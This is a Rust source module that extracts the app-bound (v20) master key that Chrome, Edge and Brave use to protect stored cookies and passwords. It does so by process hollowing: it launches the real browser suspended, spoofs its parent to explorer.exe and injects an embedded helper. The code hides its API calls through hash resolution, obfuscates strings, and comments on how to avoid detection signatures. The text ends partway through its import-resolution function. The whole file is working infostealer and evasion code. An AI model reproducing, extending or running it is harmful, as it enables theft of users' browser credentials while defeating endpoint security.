//! App-Bound Encryption (v20) master key recovery via the browser's own
//! elevation service.
//!
//! Chrome 127+/Edge/Brave validate that the IElevator caller's process image
//! lives in the browser's install dir, so we spawn the real browser binary
//! suspended (best-effort parent-PID spoofed to explorer.exe via
//! STARTUPINFOEXW), hollow it, and run the embedded no-std helper
//! (abe-helper.exe, see ../native-abe-helper) inside that process context.
//! The helper reads `Local State`, calls IElevator::DecryptData over COM, and
//! writes a fixed `KEYOK:<64 hex>` line to a named pipe we serve — with a
//! spoofed parent the child inherits handles from that parent, not from us,
//! so the pipe cannot be an inherited anonymous one. Nothing is ever written
//! to disk by us.
//!
//! All Win32/NT calls go through crate::resolve hash resolution; the module
//! adds no extern blocks and no new imports. No panics: every fallible step
//! returns None and all handles are closed on the way out.
//!
//! INTEGRATION (integrator): add `mod abe;` to lib.rs, then in chromium.rs
//! where v20 blobs are detected, obtain the key with
//!     crate::abe::decrypt_app_bound_key(&user_data, &name)
//! and AES-256-GCM-decrypt v20 blobs with it (nonce = blob[3..15]).

use std::ffi::c_void;
use std::path::{Path, PathBuf};

use crate::resolve::{fnv1a, resolve, wide};

/// Embedded helper image. Produced by ../build.bat (builds
/// ../native-abe-helper and copies abe-helper.exe next to Cargo.toml).
static HELPER_PE: &[u8] = include_bytes!("../abe-helper.exe");

const CREATE_SUSPENDED: u32 = 0x4;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x0008_0000;
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0000;
const PROCESS_CREATE_PROCESS: u32 = 0x0080;
const TH32CS_SNAPPROCESS: u32 = 0x2;
const STARTF_USESHOWWINDOW: u32 = 0x1;
const MEM_COMMIT_RESERVE: u32 = 0x3000;
const PAGE_READWRITE: u32 = 0x4;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PIPE_ACCESS_INBOUND: u32 = 0x1;
const PIPE_TYPE_BYTE: u32 = 0x0;
const PIPE_READMODE_BYTE: u32 = 0x0;
const PIPE_WAIT: u32 = 0x0;
const PIPE_REJECT_REMOTE_CLIENTS: u32 = 0x8;
const WAIT_TIMEOUT_MS: u32 = 15_000;
const CONTEXT_FULL_X64: u32 = 0x0010_000B; // CONTEXT_AMD64|CONTROL|INTEGER|FLOATING_POINT
const PEB_IMAGE_BASE_OFFSET: usize = 0x10;
const MAX_IMAGE_SIZE: usize = 64 * 1024 * 1024;
const MAX_PIPE_READ: usize = 4096;

type Handle = *mut c_void;

// ---------------------------------------------------------------------------
// Win32 structures
// ---------------------------------------------------------------------------

#[repr(C)]
#[derive(Clone, Copy)]
struct StartupInfoW {
    cb: u32,
    lp_reserved: *mut u16,
    lp_desktop: *mut u16,
    lp_title: *mut u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    h_std_input: Handle,
    h_std_output: Handle,
    h_std_error: Handle,
}

#[repr(C)]
struct StartupInfoExW {
    startup_info: StartupInfoW,
    lp_attribute_list: *mut c_void,
}

const _: () = assert!(
    std::mem::size_of::<StartupInfoExW>() == std::mem::size_of::<StartupInfoW>() + 8
);

/// Toolhelp process entry (same layout as procs.rs; that module's helpers
/// are private, so we keep a minimal local copy).
#[repr(C)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

#[repr(C)]
struct ProcessInformation {
    h_process: Handle,
    h_thread: Handle,
    dw_process_id: u32,
    dw_thread_id: u32,
}

#[repr(C)]
struct ProcessBasicInformation {
    exit_status: i32,
    _pad: i32,
    peb_base_address: *mut c_void,
    affinity_mask: usize,
    base_priority: i32,
    _pad2: i32,
    unique_process_id: usize,
    inherited_from_unique_process_id: usize,
}

/// x64 CONTEXT; we only touch flags and rcx, the rest is passed through.
#[repr(C, align(16))]
struct Context {
    p1_home: u64,
    p2_home: u64,
    p3_home: u64,
    p4_home: u64,
    p5_home: u64,
    p6_home: u64,
    context_flags: u32,
    mx_csr: u32,
    seg_cs: u16,
    seg_ds: u16,
    seg_es: u16,
    seg_fs: u16,
    seg_gs: u16,
    seg_ss: u16,
    eflags: u32,
    dr0: u64,
    dr1: u64,
    dr2: u64,
    dr3: u64,
    dr6: u64,
    dr7: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rbx: u64,
    rsp: u64,
    rbp: u64,
    rsi: u64,
    rdi: u64,
    r8: u64,
    r9: u64,
    r10: u64,
    r11: u64,
    r12: u64,
    r13: u64,
    r14: u64,
    r15: u64,
    rip: u64,
    _rest: [u8; 1232 - 0x100],
}

const _: () = assert!(std::mem::size_of::<Context>() == 1232);
const _: () = assert!(std::mem::size_of::<ProcessBasicInformation>() == 48);

// ---------------------------------------------------------------------------
// Resolved function pointer types
// ---------------------------------------------------------------------------

type CreateNamedPipeWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    u32,
    u32,
    u32,
    u32,
    *mut c_void,
) -> Handle;
type PeekNamedPipeFn =
    unsafe extern "system" fn(Handle, *mut c_void, u32, *mut u32, *mut u32, *mut u32) -> i32;
type CreateProcessWFn = unsafe extern "system" fn(
    *const u16,
    *mut u16,
    *mut c_void,
    *mut c_void,
    i32,
    u32,
    *mut c_void,
    *const u16,
    *mut StartupInfoW,
    *mut ProcessInformation,
) -> i32;
type ReadFileFn = unsafe extern "system" fn(Handle, *mut u8, u32, *mut u32, *mut c_void) -> i32;
type WaitForSingleObjectFn = unsafe extern "system" fn(Handle, u32) -> u32;
type TerminateProcessFn = unsafe extern "system" fn(Handle, u32) -> i32;
type GetThreadContextFn = unsafe extern "system" fn(Handle, *mut Context) -> i32;
type SetThreadContextFn = unsafe extern "system" fn(Handle, *const Context) -> i32;
type ResumeThreadFn = unsafe extern "system" fn(Handle) -> u32;
type VirtualAllocExFn = unsafe extern "system" fn(Handle, Handle, usize, u32, u32) -> Handle;
type VirtualProtectExFn = unsafe extern "system" fn(Handle, Handle, usize, u32, *mut u32) -> i32;
type WriteProcessMemoryFn =
    unsafe extern "system" fn(Handle, Handle, *const c_void, usize, *mut usize) -> i32;
type ReadProcessMemoryFn =
    unsafe extern "system" fn(Handle, *const c_void, *mut c_void, usize, *mut usize) -> i32;
type NtQueryInformationProcessFn =
    unsafe extern "system" fn(Handle, u32, *mut c_void, u32, *mut u32) -> i32;
type NtUnmapViewOfSectionFn = unsafe extern "system" fn(Handle, Handle) -> i32;
type InitializeProcThreadAttributeListFn =
    unsafe extern "system" fn(*mut c_void, u32, u32, *mut usize) -> i32;
type UpdateProcThreadAttributeFn = unsafe extern "system" fn(
    *mut c_void,
    u32,
    usize,
    *const c_void,
    usize,
    *mut c_void,
    *mut usize,
) -> i32;
type DeleteProcThreadAttributeListFn = unsafe extern "system" fn(*mut c_void);
type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> Handle;
type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> Handle;
type Process32FirstWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;
type Process32NextWFn = unsafe extern "system" fn(Handle, *mut ProcessEntry32W) -> i32;

/// Transmute a resolved address into a typed fn pointer; None if unresolved.
unsafe fn tf<T>(addr: usize) -> Option<T> {
    if addr == 0 {
        None
    } else {
        Some(std::mem::transmute_copy(&addr))
    }
}

unsafe fn dyn_close_handle(h: Handle) {
    let fp = resolve("kernel32.dll", crate::api!("CloseHandle"));
    if fp != 0 && !h.is_null() {
        let f: unsafe extern "system" fn(Handle) -> i32 = std::mem::transmute(fp);
        f(h);
    }
}

unsafe fn dyn_delete_attr_list(p: *mut c_void) {
    // Resolved from kernelbase: kernel32 forwards the attribute-list APIs to
    // api-ms-win-core-processthreads-l1-1-0, which forwards right back to
    // kernel32 — a cycle resolve()'s depth cap cannot catch (it restarts at
    // depth 0 on every hop).
    let fp = resolve(&crate::obf!("kernelbase.dll"), crate::api!("DeleteProcThreadAttributeList"));
    if fp != 0 && !p.is_null() {
        let f: DeleteProcThreadAttributeListFn = std::mem::transmute(fp);
        f(p);
    }
}

struct HandleGuard(Handle);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe { dyn_close_handle(self.0) }
    }
}

// ---------------------------------------------------------------------------
// Parent-PID spoofing (best-effort)
// ---------------------------------------------------------------------------

/// Extended startup info parenting the new browser process to explorer.exe,
/// so the hollowed process does not appear as a child of our host.
struct ParentSpoof {
    si_ex: StartupInfoExW,
    // Backing storage for si_ex.lp_attribute_list; never resized after the
    // pointer is taken, so the attribute list stays valid.
    _attr_storage: Vec<u8>,
    parent: Handle,
}

impl Drop for ParentSpoof {
    fn drop(&mut self) {
        unsafe {
            dyn_delete_attr_list(self.si_ex.lp_attribute_list);
            dyn_close_handle(self.parent);
        }
    }
}

/// Find a process PID by exact exe name (case-insensitive) via Toolhelp32.
unsafe fn find_process_id(exe_name: &str) -> Option<u32> {
    let k32 = "kernel32.dll";
    let snapshot: CreateToolhelp32SnapshotFn =
        tf(resolve(k32, crate::api!("CreateToolhelp32Snapshot")))?;
    let first: Process32FirstWFn = tf(resolve(k32, crate::api!("Process32FirstW")))?;
    let next: Process32NextWFn = tf(resolve(k32, crate::api!("Process32NextW")))?;

    let snap = snapshot(TH32CS_SNAPPROCESS, 0);
    if snap.is_null() || snap as isize == -1 {
        return None;
    }
    let mut entry: ProcessEntry32W = std::mem::zeroed();
    entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
    let mut found = None;
    if first(snap, &mut entry) != 0 {
        loop {
            let len = entry
                .sz_exe_file
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(entry.sz_exe_file.len());
            let name = String::from_utf16_lossy(&entry.sz_exe_file[..len]);
            if name.eq_ignore_ascii_case(exe_name) {
                found = Some(entry.th32_process_id);
                break;
            }
            if next(snap, &mut entry) == 0 {
                break;
            }
        }
    }
    dyn_close_handle(snap);
    found
}

/// Build a STARTUPINFOEXW with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing
/// at explorer.exe. Best-effort: None if any step fails, and the caller falls
/// back to a plain STARTUPINFOW creation.
///
/// Note: with a spoofed parent the child inherits handles from the spoofed
/// parent, not from us — which is why the helper's output channel is a named
/// pipe it connects to itself, not an inherited anonymous pipe.
unsafe fn prepare_parent_spoof(si: &StartupInfoW) -> Option<ParentSpoof> {
    let k32 = "kernel32.dll";
    // kernelbase, not kernel32: kernel32 forwards these to an API-set stub
    // that forwards back to kernel32, which loops resolve() forever.
    let kbase = crate::obf!("kernelbase.dll");
    let init: InitializeProcThreadAttributeListFn =
        tf(resolve(&kbase, crate::api!("InitializeProcThreadAttributeList")))?;
    let update: UpdateProcThreadAttributeFn =
        tf(resolve(&kbase, crate::api!("UpdateProcThreadAttribute")))?;
    let open_process: OpenProcessFn = tf(resolve(k32, crate::api!("OpenProcess")))?;

    let pid = find_process_id(&crate::obf!("explorer.exe"))?;
    let parent = open_process(PROCESS_CREATE_PROCESS, 0, pid);
    if parent.is_null() {
        return None;
    }

    let mut size: usize = 0;
    // First call is a size query and is expected to fail with size set.
    init(std::ptr::null_mut(), 1, 0, &mut size);
    if size == 0 {
        dyn_close_handle(parent);
        return None;
    }
    let mut storage = vec![0u8; size];
    let list = storage.as_mut_ptr() as *mut c_void;
    if init(list, 1, 0, &mut size) == 0 {
        dyn_close_handle(parent);
        return None;
    }
    if update(
        list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &parent as *const Handle as *const c_void,
        std::mem::size_of::<Handle>(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
    ) == 0
    {
        dyn_delete_attr_list(list);
        dyn_close_handle(parent);
        return None;
    }

    let mut si_ex = StartupInfoExW {
        startup_info: *si,
        lp_attribute_list: list,
    };
    // With EXTENDED_STARTUPINFO_PRESENT, cb covers the whole STARTUPINFOEXW.
    si_ex.startup_info.cb = std::mem::size_of::<StartupInfoExW>() as u32;
    Some(ParentSpoof {
        si_ex,
        _attr_storage: storage,
        parent,
    })
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

/// Recover the 32-byte app-bound (v20) master key for the given browser.
/// `browser_root` is the browser's "User Data" directory, `browser_name` a
/// display name ("Chrome", "Edge", "Brave-Browser", ...). None on any failure.
pub fn decrypt_app_bound_key(browser_root: &Path, browser_name: &str) -> Option<Vec<u8>> {
    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
        decrypt_inner(browser_root, browser_name)
    }))
    .ok()
    .flatten()
}

unsafe fn decrypt_inner(browser_root: &Path, browser_name: &str) -> Option<Vec<u8>> {
    let canonical = canonical_browser_name(browser_name)?;
    let exe = find_browser_exe(canonical)?;
    let local_state = browser_root.join(crate::obf!("Local State"));
    if !local_state.is_file() {
        return None;
    }

    let k32 = "kernel32.dll";
    let ntdll = crate::obf!("ntdll.dll");
    let create_process_w: CreateProcessWFn = tf(resolve(k32, crate::api!("CreateProcessW")))?;
    let read_file: ReadFileFn = tf(resolve(k32, crate::api!("ReadFile")))?;
    let wait_for_single_object: WaitForSingleObjectFn =
        tf(resolve(k32, crate::api!("WaitForSingleObject")))?;
    let terminate_process: TerminateProcessFn = tf(resolve(k32, crate::api!("TerminateProcess")))?;
    let get_thread_context: GetThreadContextFn = tf(resolve(k32, crate::api!("GetThreadContext")))?;
    let set_thread_context: SetThreadContextFn = tf(resolve(k32, crate::api!("SetThreadContext")))?;
    let resume_thread: ResumeThreadFn = tf(resolve(k32, crate::api!("ResumeThread")))?;
    let virtual_alloc_ex: VirtualAllocExFn = tf(resolve(k32, crate::api!("VirtualAllocEx")))?;
    // Optional: without it we fall back to leaving the hollow RWX.
    let virtual_protect_ex: Option<VirtualProtectExFn> =
        tf(resolve(k32, crate::api!("VirtualProtectEx")));
    let write_process_memory: WriteProcessMemoryFn =
        tf(resolve(k32, crate::api!("WriteProcessMemory")))?;
    let read_process_memory: ReadProcessMemoryFn = tf(resolve(k32, crate::api!("ReadProcessMemory")))?;
    let nt_query_information_process: NtQueryInformationProcessFn =
        tf(resolve(&ntdll, crate::api!("NtQueryInformationProcess")))?;
    let nt_unmap_view_of_section: NtUnmapViewOfSectionFn =
        tf(resolve(&ntdll, crate::api!("NtUnmapViewOfSection")))?;
    let create_named_pipe_w: CreateNamedPipeWFn = tf(resolve(k32, crate::api!("CreateNamedPipeW")))?;
    let peek_named_pipe: PeekNamedPipeFn = tf(resolve(k32, crate::api!("PeekNamedPipe")))?;

    // Named pipe for the helper's key output. With a spoofed parent the child
    // inherits handles from the spoofed parent, not from us, so the helper
    // cannot receive an inherited anonymous pipe and connects here itself.
    // The name is randomized per run; a static pipe prefix is a signature.
    let pipe_name = format!("{}{}", crate::obf!("\\\\.\\pipe\\"), random_pipe_suffix());
    let pipe_w = wide(&pipe_name);
    let pipe = create_named_pipe_w(
        pipe_w.as_ptr(),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
        1,
        4096,
        4096,
        0,
        std::ptr::null_mut(),
    );
    if pipe.is_null() || pipe as isize == -1 {
        return None;
    }
    let pipe_guard = HandleGuard(pipe);

    // Benign-looking command line: the real browser image plus our helper
    // arguments. The elevation service validates the process image path
    // (lpApplicationName), not the command line.
    let cmdline = format!(
        "\"{}\" \"{}\" {} \"{}\"",
        exe.display(),
        local_state.display(),
        canonical,
        pipe_name
    );
    let exe_w = wide(&exe.to_string_lossy());
    let mut cmdline_w = wide(&cmdline);

    let mut si: StartupInfoW = std::mem::zeroed();
    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
    si.dw_flags = STARTF_USESHOWWINDOW;
    si.w_show_window = 0; // SW_HIDE

    let mut pi: ProcessInformation = std::mem::zeroed();

    // Best-effort parent-PID spoof: parent the browser process to
    // explorer.exe so it does not appear as our child. Any spoof-setup
    // failure falls back to the plain suspended creation.
    let mut spoof = prepare_parent_spoof(&si);
    let used_spoof = spoof.is_some();
    let mut created = match spoof.as_mut() {
        Some(s) => create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut s.si_ex as *mut StartupInfoExW as *mut StartupInfoW,
            &mut pi,
        ),
        None => create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        ),
    };
    // The attribute list and parent handle are only needed for creation.
    drop(spoof);
    if created == 0 && used_spoof {
        // Extended creation failed (e.g. attribute rejected): retry plain.
        pi = std::mem::zeroed();
        created = create_process_w(
            exe_w.as_ptr(),
            cmdline_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );
    }
    if created == 0 {
        return None;
    }
    let proc_guard = HandleGuard(pi.h_process);
    let thread_guard = HandleGuard(pi.h_thread);

    let (image, pe) = build_helper_image()?;

    // From here on the child always gets terminated before we return.
    let resumed = hollow_and_resume(
        pi.h_process,
        pi.h_thread,
        &image,
        &pe,
        nt_query_information_process,
        read_process_memory,
        nt_unmap_view_of_section,
        virtual_alloc_ex,
        virtual_protect_ex,
        write_process_memory,
        get_thread_context,
        set_thread_context,
        resume_thread,
    );
    if resumed {
        wait_for_single_object(pi.h_process, WAIT_TIMEOUT_MS);
    }
    terminate_process(pi.h_process, 0);

    // Collect whatever the helper wrote (nothing if hollowing failed). Peek
    // first: ReadFile on a server end with no client would block forever.
    let mut out: Vec<u8> = Vec::with_capacity(128);
    let mut buf = [0u8; 256];
    loop {
        let mut avail: u32 = 0;
        if peek_named_pipe(
            pipe,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            &mut avail,
            std::ptr::null_mut(),
        ) == 0
            || avail == 0
        {
            break;
        }
        let mut n: u32 = 0;
        if read_file(pipe, buf.as_mut_ptr(), buf.len() as u32, &mut n, std::ptr::null_mut()) == 0
            || n == 0
        {
            break;
        }
        out.extend_from_slice(&buf[..n as usize]);
        if out.len() >= MAX_PIPE_READ {
            break;
        }
    }

    drop(proc_guard);
    drop(thread_guard);
    drop(pipe_guard);

    parse_hex_key(&out)
}

/// Random pipe name suffix: 8 random lowercase letters + pid/nanos.
/// Entropy: rdtsc mixed with GetTickCount64 and the wall clock (same
/// approach as jitter.rs; no rand crate).
fn random_pipe_suffix() -> String {
    let tsc = unsafe {
        let lo: u32;
        let hi: u32;
        core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi);
        ((hi as u64) << 32) | lo as u64
    };
    let tick = unsafe {
        let f = resolve("kernel32.dll", crate::api!("GetTickCount64"));
        if f != 0 {
            let f: unsafe extern "system" fn() -> u64 = std::mem::transmute(f);
            f()
        } else {
            0
        }
    };
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u64)
        .unwrap_or(0);
    let mut x = tsc ^ tick.rotate_left(17) ^ nanos.rotate_left(31) ^ 0x9e3779b97f4a7c15;
    if x == 0 {
        x = 0x2545f4914f6cdd1d;
    }
    let mut letters = String::with_capacity(8);
    for _ in 0..8 {
        // xorshift64*
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        letters.push((b'a' + (x % 26) as u8) as char);
    }
    format!(
        "{}-{:08x}{:08x}",
        letters,
        std::process::id(),
        nanos as u32
    )
}

/// Loose display-name matching to the helper's canonical browser names.
fn canonical_browser_name(name: &str) -> Option<&'static str> {
    let n = name.to_ascii_lowercase();
    if n.contains("chrome") {
        Some("chrome")
    } else if n.contains("edge") {
        Some("edge")
    } else if n.contains("brave") {
        Some("brave")
    } else {
        None
    }
}

fn find_browser_exe(canonical: &str) -> Option<PathBuf> {
    let (rel, envs): (String, &[&str]) = match canonical {
        "chrome" => (
            crate::obf!("Google\\Chrome\\Application\\chrome.exe"),
            &["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"],
        ),
        "edge" => (
            crate::obf!("Microsoft\\Edge\\Application\\msedge.exe"),
            &["ProgramFiles(x86)", "ProgramFiles", "LOCALAPPDATA"],
        ),
        "brave" => (
            crate::obf!("BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
            &["ProgramFiles", "ProgramFiles(x86)", "LOCALAPPDATA"],
        ),
        _ => return None,
    };
    for var in envs {
        if let Ok(base) = std::env::var(var) {
            let p = Path::new(&base).join(&rel);
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Hollowing
// ---------------------------------------------------------------------------

#[allow(clippy::too_many_arguments)]
unsafe fn hollow_and_resume(
    h_process: Handle,
    h_thread: Handle,
    image: &[u8],
    pe: &PeInfo,
    nt_query_information_process: NtQueryInformationProcessFn,
    read_process_memory: ReadProcessMemoryFn,
    nt_unmap_view_of_section: NtUnmapViewOfSectionFn,
    virtual_alloc_ex: VirtualAllocExFn,
    virtual_protect_ex: Option<VirtualProtectExFn>,
    write_process_memory: WriteProcessMemoryFn,
    get_thread_context: GetThreadContextFn,
    set_thread_context: SetThreadContextFn,
    resume_thread: ResumeThreadFn,
) -> bool {
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    if nt_query_information_process(
        h_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        std::ptr::null_mut(),
    ) != 0
        || pbi.peb_base_address.is_null()
    {
        return false;
    }

    let peb_base_ptr = pbi.peb_base_address.add(PEB_IMAGE_BASE_OFFSET);
    let mut remote_base: usize = 0;
    let mut n: usize = 0;
    if read_process_memory(
        h_process,
        peb_base_ptr as *const c_void,
        &mut remote_base as *mut usize as *mut c_void,
        std::mem::size_of::<usize>(),
        &mut n,
    ) == 0
        || remote_base == 0
    {
        return false;
    }

    // Preferred plan: map the helper at its preferred base WITHOUT unmapping
    // the browser image. Classic hollowing (unmap + reuse the image base)
    // breaks COM local-server activation: with the original SEC_IMAGE mapping
    // gone, ole32/server-side checks on the process image fail with
    // ERROR_BAD_EXE_FORMAT. Keeping the real browser image mapped (and the
    // PEB untouched) preserves them. The tiny no-std helper may have no
    // .reloc section, in which case it is only runnable at its preferred
    // base anyway. Pages are allocated RW and flipped to RX after the write —
    // RWX private regions are a high-fidelity hollowing indicator.
    let mut alloc_base: u64 = 0;
    let a = virtual_alloc_ex(
        h_process,
        pe.preferred_base as usize as Handle,
        image.len(),
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    );
    if !a.is_null() {
        alloc_base = a as usize as u64;
    }

    // Fallback: classic hollowing. Unmap the browser image, reuse its base
    // (relocating the helper if it has a .reloc section), and fix up the PEB.
    let mut unmapped = false;
    if alloc_base == 0 {
        nt_unmap_view_of_section(h_process, remote_base as Handle);
        unmapped = true;
        for base in [remote_base as u64, pe.preferred_base, 0] {
            let a = virtual_alloc_ex(
                h_process,
                base as usize as Handle,
                image.len(),
                MEM_COMMIT_RESERVE,
                PAGE_READWRITE,
            );
            if a.is_null() {
                continue;
            }
            let got = a as usize as u64;
            if got == pe.preferred_base || pe.reloc_size != 0 {
                alloc_base = got;
                break;
            }
            // Landed somewhere unusable and cannot relocate; leave the
            // reservation (the child is about to be terminated) and keep
            // trying.
        }
    }
    if alloc_base == 0 {
        return false;
    }

    let mut patched: Vec<u8>;
    let final_image: &[u8] = if alloc_base != pe.preferred_base {
        if pe.reloc_size == 0 {
            return false; // cannot relocate an image without .reloc
        }
        patched = image.to_vec();
        if apply_relocations(
            &mut patched,
            pe.reloc_rva,
            pe.reloc_size,
            alloc_base.wrapping_sub(pe.preferred_base),
        )
        .is_none()
        {
            return false;
        }
        &patched
    } else {
        image
    };

    let mut written: usize = 0;
    if write_process_memory(
        h_process,
        alloc_base as usize as Handle,
        final_image.as_ptr() as *const c_void,
        final_image.len(),
        &mut written,
    ) == 0
        || written != final_image.len()
    {
        return false;
    }

    // Keep the PEB consistent only if we actually replaced the image.
    if unmapped && alloc_base as usize != remote_base {
        if write_process_memory(
            h_process,
            peb_base_ptr as Handle,
            &alloc_base as *const u64 as *const c_void,
            std::mem::size_of::<u64>(),
            &mut written,
        ) == 0
        {
            return false;
        }
    }

    // Flip the written image to RX before resuming. If VirtualProtectEx is
    // unavailable or fails, fall back to RWX rather than fail the hollow.
    if let Some(vp) = virtual_protect_ex {
        let mut old_protect: u32 = 0;
        if vp(
            h_process,
            alloc_base as usize as Handle,
            final_image.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            vp(
                h_process,
                alloc_base as usize as Handle,
                final_image.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );
        }
    }

    let mut ctx: Context = std::mem::zeroed();
    ctx.context_flags = CONTEXT_FULL_X64;
    if get_thread_context(h_thread, &mut ctx) == 0 {
        return false;
    }
    ctx.rcx = alloc_base + pe.entry_rva as u64;
    if set_thread_context(h_thread, &ctx) == 0 {
        return false;
    }
    resume_thread(h_thread) != u32::MAX
}

// ---------------------------------------------------------------------------
// Helper PE image construction (headers + sections + imports + relocations)
// ---------------------------------------------------------------------------

struct PeInfo {
    entry_rva: u32,
    preferred_base: u64,
    reloc_rva: u32,
    reloc_size: u32,
}

fn rd_u16(b: &[u8], off: usize) -> Option<u16> {
    Some(u16::from_le_bytes(b.get(off..off.checked_add(2)?)?.try_into().ok()?))
}

fn rd_u32(b: &[u8], off: usize) -> Option<u32> {
    Some(u32::from_le_bytes(b.get(off..off.checked_add(4)?)?.try_into().ok()?))
}

fn rd_u64(b: &[u8], off: usize) -> Option<u64> {
    Some(u64::from_le_bytes(b.get(off..off.checked_add(8)?)?.try_into().ok()?))
}

/// C string at `off` as &str (import DLL/function names are ASCII).
fn cstr(b: &[u8], off: usize) -> Option<&str> {
    let s = b.get(off..)?;
    let end = s.iter().position(|&c| c == 0)?;
    std::str::from_utf8(s.get(..end)?).ok()
}

/// Lay the embedded helper out as a loaded image and resolve its imports
/// against our local DLLs. The helper is no_std and imports only from
/// kernel32/ntdll, which are mapped at identical addresses in every process,
/// so locally resolved IAT entries are valid in the child.
fn build_helper_image() -> Option<(Vec<u8>, PeInfo)> {
    let pe = HELPER_PE;
    let e_lfanew = rd_u32(pe, 0x3c)? as usize;
    if pe.get(e_lfanew..e_lfanew.checked_add(4)?)? != b"PE\0\0" {
        return None;
    }
    let num_sections = rd_u16(pe, e_lfanew.checked_add(6)?)? as usize;
    let opt_size = rd_u16(pe, e_lfanew.checked_add(20)?)? as usize;
    let opt = e_lfanew.checked_add(24)?;
    if rd_u16(pe, opt)? != 0x20b {
        return None; // PE32+ only
    }
    let entry_rva = rd_u32(pe, opt.checked_add(16)?)?;
    let preferred_base = rd_u64(pe, opt.checked_add(24)?)?;
    let size_of_image = rd_u32(pe, opt.checked_add(56)?)? as usize;
    let size_of_headers = rd_u32(pe, opt.checked_add(60)?)? as usize;
    if size_of_image == 0 || size_of_image > MAX_IMAGE_SIZE || size_of_headers > pe.len() {
        return None;
    }
    let import_rva = rd_u32(pe, opt.checked_add(112 + 8)?)?;
    let reloc_rva = rd_u32(pe, opt.checked_add(112 + 5 * 8)?)?;
    let reloc_size = rd_u32(pe, opt.checked_add(112 + 5 * 8 + 4)?)?;
    let tls_rva = rd_u32(pe, opt.checked_add(112 + 9 * 8)?)? as usize;

    let mut image = vec![0u8; size_of_image];
    image[..size_of_headers].copy_from_slice(pe.get(..size_of_headers)?);

    let sec_table = opt.checked_add(opt_size)?;
    for i in 0..num_sections {
        let s = sec_table.checked_add(i.checked_mul(40)?)?;
        let vaddr = rd_u32(pe, s.checked_add(12)?)? as usize;
        let raw_size = rd_u32(pe, s.checked_add(16)?)? as usize;
        let raw_off = rd_u32(pe, s.checked_add(20)?)? as usize;
        if raw_size == 0 {
            continue;
        }
        let src = pe.get(raw_off..raw_off.checked_add(raw_size)?)?;
        let room = size_of_image.checked_sub(vaddr)?;
        let n = raw_size.min(room);
        image[vaddr..vaddr.checked_add(n)?].copy_from_slice(src.get(..n)?);
    }

    // TLS callbacks would never run under manual mapping; the no_std helper
    // has none. Bail rather than run a half-initialized image.
    if tls_rva != 0 && rd_u64(&image, tls_rva.checked_add(24)?)? != 0 {
        return None;
    }

    resolve_imports(&mut image, import_rva)?;

    Some((
        image,
        PeInfo {
            entry_rva,
            preferred_base,
            reloc_rva,
            reloc_size,
        },
    ))
}

/// Walk the import descriptor table in the laid-out image and patch each IAT
/// slot with the locally resolved address (valid remotely for kernel32/ntdll,
/// which share their base across all processes).
fn resolve_imports(image: &mut [u8], import_rva: u32) -> Option<()> {
    if import_rva == 0 {
        return Some(());
    }
    let mut d = import_rva as usize;
    for _ in 0..256 {
        let oft = rd_u32(image, d)? as usize;
        let name_rva = rd_u32(image, d.checked_add(12)?)? as usize;
        let ft = rd_u32(image, d.checked_add(16)?)? as usize;
